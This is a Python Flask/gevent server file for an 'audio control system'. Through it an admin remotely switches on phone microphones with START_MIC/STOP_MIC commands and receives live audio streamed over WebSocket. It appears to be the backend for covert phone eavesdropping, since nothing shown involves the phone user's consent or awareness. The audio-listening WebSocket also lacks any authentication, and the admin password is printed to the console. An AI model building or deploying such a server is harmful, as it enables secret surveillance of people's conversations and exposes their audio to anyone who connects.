"""
Avni Audio Control System - Backend Server
Render.com compatible — HTTP + WebSocket on same port
"""

import os
import json
import asyncio
import threading
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
from geventwebsocket.handler import WebSocketHandler
from geventwebsocket import WebSocketError
from gevent.pywsgi import WSGIServer
from gevent import monkey
from dotenv import load_dotenv
import os

load_dotenv()
monkey.patch_all()

# ─── CONFIG ───────────────────────────────────────────────────────────────────

SECRET_TOKEN   = os.environ.get("SECRET_TOKEN")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD")
PORT = int(os.environ.get('PORT', 5000))

# ─── STATE ────────────────────────────────────────────────────────────────────
devices        = {}  # device_id -> info
device_sockets = {}  # device_id -> websocket
audio_clients  = {}  # device_id -> [admin ws...]

# ─── FLASK ────────────────────────────────────────────────────────────────────
app = Flask(__name__)
CORS(app, origins="*")

def check_auth(req):
    return req.headers.get('Authorization','') == f'Bearer {SECRET_TOKEN}'

@app.route('/health', methods=['GET'])
def health():
    return jsonify({'status':'running','devices':len(devices)})

@app.route('/admin/login', methods=['POST'])
def admin_login():
    if request.json.get('password') == ADMIN_PASSWORD:
        return jsonify({'status':'ok','token':SECRET_TOKEN})
    return jsonify({'error':'Invalid password'}),401

@app.route('/register', methods=['POST'])
def register_device():
    if not check_auth(request): return jsonify({'error':'Unauthorized'}),401
    data = request.json
    device_id = data.get('device_id')
    dev_name  = data.get('device_name','Unknown Phone')
    if not device_id: return jsonify({'error':'device_id required'}),400

    if device_id not in devices:
        friendly = f'Phone No.{len(devices)+1}'
    else:
        friendly = devices[device_id].get('friendly_name', dev_name)

    devices[device_id] = {
        'device_id':    device_id,
        'device_name':  dev_name,
        'friendly_name':friendly,
        'last_seen':    datetime.now().isoformat(),
        'streaming':    False,
        'mic_enabled':  False,
    }
    print(f'[+] Registered: {friendly}')
    return jsonify({'status':'ok','device_id':device_id,'friendly_name':friendly})

@app.route('/devices', methods=['GET'])
def list_devices():
    tok = request.headers.get('Authorization','') or f"Bearer {request.args.get('token','')}"
    if tok != f'Bearer {SECRET_TOKEN}': return jsonify({'error':'Unauthorized'}),401
    return jsonify(list(devices.values()))

@app.route('/command/<device_id>', methods=['POST'])
def send_command(device_id):
    if not check_auth(request): return jsonify({'error':'Unauthorized'}),401
    cmd = request.json.get('command')
    if cmd not in ('START_MIC','STOP_MIC'):
        return jsonify({'error':'Invalid command'}),400

    ws = device_sockets.get(device_id)
    if not ws:
        return jsonify({'error':'Device not connected'}),404

    try:
        ws.send(json.dumps({'cmd': cmd}))
        if device_id in devices:
            devices[device_id]['mic_enabled'] = (cmd == 'START_MIC')
        print(f'[CMD] {cmd} → {device_id[:8]}...')
        return jsonify({'status':'ok','command':cmd})
    except Exception as e:
        return jsonify({'error': str(e)}),500

# ─── WEBSOCKET HANDLER ────────────────────────────────────────────────────────
@app.route('/ws/<role>/<device_id>')
def websocket_handler(role, device_id):
    ws = request.environ.get('wsgi.websocket')
    if not ws:
        return 'WebSocket required', 400

    if role == 'audio':
        handle_phone(ws, device_id)
    elif role == 'listen':
        handle_admin(ws, device_id)

    return ''

def handle_phone(ws, device_id):
    device_sockets[device_id] = ws

    if device_id not in devices:
        friendly = f'Phone No.{len(devices)+1}'
        devices[device_id] = {
            'device_id':    device_id,
            'device_name':  'Unknown Phone',
            'friendly_name':friendly,
            'last_seen':    datetime.now().isoformat(),
            'streaming':    False,
            'mic_enabled':  False,
        }
        print(f'[+] Auto-registered: {friendly}')

    devices[device_id]['last_seen'] = datetime.now().isoformat()
    print(f'[+] Phone connected: {device_id[:8]}...')

    try:
        while True:
            data = ws.receive()
            if data is None:
                break

            # JSON control message
            if isinstance(data, str) and len(data) < 200:
                try:
                    msg = json.loads(data)
                    if 'status' in msg:
                        devices[device_id]['streaming'] = (msg['status'] == 'streaming')
                    devices[device_id]['last_seen'] = datetime.now().isoformat()
                    continue
                except:
                    pass

            # Audio data — forward to admin listeners
            devices[device_id]['streaming'] = True
            devices[device_id]['last_seen'] = datetime.now().isoformat()

            listeners = audio_clients.get(device_id, [])
            dead = []
            for listener in listeners:
                try:
                    listener.send(data)
                except:
                    dead.append(listener)
            for d in dead:
                listeners.remove(d)

    except WebSocketError as e:
        print(f'Phone WS error: {e}')
    finally:
        device_sockets.pop(device_id, None)
        if device_id in devices:
            devices[device_id]['streaming']   = False
            devices[device_id]['mic_enabled'] = False
        print(f'[-] Phone disconnected: {device_id[:8]}...')

def handle_admin(ws, device_id):
    audio_clients.setdefault(device_id, []).append(ws)
    print(f'[+] Admin listening: {device_id[:8]}...')
    try:
        while True:
            msg = ws.receive()
            if msg is None:
                break
    except WebSocketError:
        pass
    finally:
        try:
            audio_clients[device_id].remove(ws)
        except:
            pass
        print(f'[-] Admin stopped: {device_id[:8]}...')

# ─── MAIN ─────────────────────────────────────────────────────────────────────
if __name__ == '__main__':
    print('='*50)
    print('  Avni Audio Control System')
    print(f'  Port → {PORT}')
    print(f'  PW   → {ADMIN_PASSWORD}')
    print('='*50)

    server = WSGIServer(('0.0.0.0', PORT), app, handler_class=WebSocketHandler)
    print(f'Server running on port {PORT}')
    server.serve_forever()
